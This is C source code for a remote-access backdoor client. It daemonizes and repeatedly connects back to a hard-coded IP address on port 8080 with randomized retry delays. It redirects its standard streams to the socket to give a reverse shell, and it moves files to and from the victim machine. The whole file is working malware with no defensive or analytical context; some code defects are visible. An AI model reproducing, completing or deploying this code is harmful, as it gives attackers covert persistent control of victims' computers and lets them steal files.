

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <semaphore.h>
#include <strings.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/wait.h>
#include <pthread.h>

#define PORT 8080

#define SUCCESS 0
#define DAMAGE -2
#define REFUSE -3
#define EXIST -4

void client_upload_file_shell(const char *filename);


struct computer
{   int sock;
    socklen_t sock_len;
    struct sockaddr_in sock_attr;
    
    char ip_c[16];
    unsigned short port_i;
};

static struct computer target;

void ppp(const char *title,int ret)
{   if(ret==-1)
    {   perror("title");
        abort();
    }
}

char Getch()
{   char ch0,ch,ret0,ret;
    ret0=read(target.sock,&ch0,1);

    do{
        ret=read(target.sock,&ch,1);
    }while( (ret==1 && ch!='\n') || (ret==-1 && errno==EINTR));

    if(ret0==0)
        return '4';
    else
        return ch0;
}

int ispipeblock(const char *title,int ret)
{   if(ret==-1 && errno==EPIPE)
        return 0;
    else if(ret ==-1)
    {   perror(title);
        abort();
    }
}

int ispipeend(const char *title,int ret)
{   if(ret==0)
        return 0;
    else if(ret ==-1)
    {   perror(title);
        abort();
    }
}

int f_download_tcp(struct computer *cmp,const char *filename)
{   
    int ret;
    ret=access(filename,F_OK);
    if(ret==0)
        goto up2;

    ssize_t f_size;
    ret=read(cmp->sock,&f_size,sizeof(f_size));
    if(!ispipeend("99",ret))    
        goto up1;

    char ch='n';
    char *f_mem=(char *)malloc(f_size);
    if(f_mem==NULL)
        ch='n';
    else
        ch='y';

    ret=write(cmp->sock,&ch,1);
    if(!ispipeblock("114",ret))
        goto up1;    

    ssize_t f_page=f_size/1024;
    ssize_t f_rest=f_size%1024;

    ssize_t recv_size=0;
    for(int i=0;i<f_page;i++)
    {   ret=read(cmp->sock,f_mem,1024);
        ispipeend("123",ret);
        
        recv_size+=ret;
        f_mem+=1024;
    }
    ret=read(cmp->sock,f_mem,f_rest);
    ispipeend("129",ret);
    recv_size+=ret;

    if(recv_size==f_size)
    {   int fd=open(filename,O_CREAT|O_TRUNC|O_RDWR,0666);
        ppp("177",fd);
        write(fd,f_mem,f_size);
        close(fd);
        return SUCCESS;
    }
    else
    {   printf("file damaged!\n");
        return DAMAGE;
    }
    
    up2:
    {   printf("file is exist\n");
        return EXIST;
    }

    up1:
        printf("target computer refuse\n");
    return REFUSE;
}

int f_sendto_tcp(struct computer *cmp,const char *filename)
{   
    int ret;
    int fd=open(filename,O_RDONLY);
    ppp("38",fd);

    ssize_t f_size=lseek(fd,0,SEEK_END);
    lseek(fd,0,SEEK_SET);

    char *f_mem=malloc(f_size);
    ret=read(fd,f_mem,f_size);

    close(fd);

    ssize_t f_page=f_size/1024;
    ssize_t f_rest=f_size%1024;

    printf("sendto file size...\n");
    write(cmp->sock,&f_size,sizeof(f_size));

    ret=0;
    printf("wait computer verify...\n");
    read(cmp->sock,&ret,1);

    printf("verify [%c]\n",*((char *)&ret));

    if( *((char *)&ret) =='y' )
    {   printf("verify successful \n");
        int sendto_size=0;
        printf("Sendto %s:%d toryfile size[%d]\n",cmp->ip_c,cmp->port_i,f_size);
        
        for(int i=0; i<f_page; i++)
        {   
            ret=write(cmp->sock,f_mem,1024);
            if(!ispipeblock("60",ret))
                goto up1;
            sendto_size+=ret;
            f_mem+=1024;
            puts("#");
        }
        ret=write(cmp->sock,f_mem,f_rest);
        if(!ispipeblock("66",ret))
                goto up1;
        sendto_size+=ret;
        puts("#");
        printf("%d %d\n",sendto_size,f_size);

        if(sendto_size==f_size)
        {   printf("Toryfile sendto successful!\n");
            return SUCCESS;
        }
        else
        {   printf("Toryfile damaged!\n");
            return DAMAGE;
        }
    }
    else
    {   up1:
        printf("Target computer is refuse!\n");
        return REFUSE;
    }
}

void cmp_init(struct computer *data,const char *ip,const short port)
{   
    bzero(data,sizeof(struct computer));
    data->sock_len=sizeof(struct sockaddr_in);
    
    data->sock=socket(AF_INET,SOCK_STREAM,0);
    // ppp("34",data->sock);

    data->sock_attr.sin_family=AF_INET;
    data->sock_attr.sin_port=htons(port);
    
    if(ip==NULL)
    {   data->sock_attr.sin_addr.s_addr=htonl(INADDR_ANY);
        inet_ntop(AF_INET,&data->sock_attr.sin_addr.s_addr,data->ip_c,16);
    }
    else
    {   data->sock_attr.sin_addr.s_addr=inet_addr(ip);
        strcpy(data->ip_c,ip);
    }

    data->port_i=port;
}

void cmp_init2(struct computer *data,int sock,struct sockaddr *temp)
{   bzero(data,sizeof(struct computer));

    data->sock=sock;
    data->sock_attr=(*(struct sockaddr_in *)temp);
    data->sock_len=sizeof(*temp);
    
    inet_ntop(AF_INET,&data->sock_attr.sin_addr.s_addr,data->ip_c,16);
    data->port_i=ntohs(data->sock_attr.sin_port);
}

void cmp_destory(struct computer *data)
{   
    close(data->sock);
}

void denypipe()
{   signal(SIGPIPE,SIG_IGN);

}

int Heartbeat_connect_target(struct computer *cmp)
{   
    close(cmp->sock);
    cmp->sock=socket(AF_INET,SOCK_STREAM,0);

    dup2(cmp->sock,0);
    dup2(cmp->sock,1);
    dup2(cmp->sock,2);

    int ret,ttl=360;
    srand(time(NULL));

    while(ttl--)
    {   ret=connect(cmp->sock,(struct sockaddr *)&cmp->sock_attr,cmp->sock_len);
        if(ret==0)
            return 0;
        else
        {   if(350<=ttl)
                sleep(3);                   // 3 sec
            else if(300<=ttl && ttl<350)
                sleep(rand()%120+1);        // 0~2 min
            else if(200<=ttl && ttl<300)
                sleep(rand()%121+180);      // 2~5min
            else if(100<=ttl && ttl<200)
                sleep(rand()%301+300);      // 5~10min
            else if(10<=ttl && ttl<100)     
                sleep(rand()%601+1200);     // 10~30min
            else
                sleep(rand()%7201+3600);    //1~3h
        }
    }
    return -1;
}

void client_become_deamon(const char *ip,unsigned short port)
{   
    int pid=fork();
    if(pid>0)
        exit(0);
    else if(pid==-1)
        exit(-1);

    setsid();
    denypipe();
    cmp_init(&target,ip,port);
    Heartbeat_connect_target(&target);
    
    chdir(getenv("HOME"));
    umask(00000);
}

void client_shell()
{   char cmd_buf[1024];
    char *env[10],count=0;
    
    while(1)
    {   printf("%s $",getcwd(NULL,0));
        fflush(stdout);
        
        fgets(cmd_buf,1023,stdin);
        cmd_buf[strlen(cmd_buf)-1]='\0';

        count=0;
        bzero(env,sizeof(env));
        env[count++]=strtok(cmd_buf," ");
        while( (count<=10) && (env[count++]=strtok(cmd_buf," ")) );

        if(!strncmp(env[0],"cd",2))
        {   chdir(env[1]);
            continue;
        }
        else if(!strncmp(env[0],"exit",4))
            break;
        else if(!strncmp(env[0],"get",3))
            client_upload_file_shell(env[1]);
        else
        {   int pid=fork();
            if(pid==0)
                execvp(env[0],env);
            else
            {   pause();
                continue;
            }
        }
    }
}

void client_download_file()
{   char filename_buf[1024];
    int ret=read(target.sock,filename_buf,1024);
    ppp("read",ret);

    ret=f_download_tcp(&target,filename_buf);
    if(ret==-1)
        printf("download fail\n");
    else
        printf("download success\n");
}

void client_upload_file_menu()
{   
    printf("%s\n",getcwd(NULL,0));

    {   int pid=fork();
        if(pid==0)
            execlp("ls","ls",NULL);
        else if(pid==-1)
            exit(-1);
        else
            wait(NULL);
    }
    
    int ret;
    char filename_buf[1024];
    
    do
    {   
        printf("get file >>>");
        fflush(stdout);
        
        //wait service report choice file name
        ret=read(target.sock,filename_buf,1024);
        ppp("read",ret);

    }while( access(filename_buf,F_OK) && puts("file is not exist") );

    write(target.sock,"y",1);
    
    sleep(5);
    f_sendto_tcp(&target,filename_buf);
}

void client_upload_file_shell(const char *filename)
{   if(!access(filename,F_OK))
        f_sendto_tcp(&target,filename);
    else
        puts("file is not exist");
}

void Client()
{   denypipe();
    client_become_deamon("192.168.1.130",PORT);
    
    char action=0;
    while(1)
    {   action=Getch();
        action=atoi(&action);
        
        switch(action)
        {   case 1:       //back shell
                client_shell();
                break;
            
            case 2:       //download file
                client_download_file();
                break;

            case 3:       //upload file
                client_upload_file_menu();
                break;
            
            case 4:
                action=Heartbeat_connect_target(&target);
                if(action==0)
                    break;
                else
                    exit(-1);

            case 0:
                continue;
        }
    }
}

int main()
{
    Client();


}
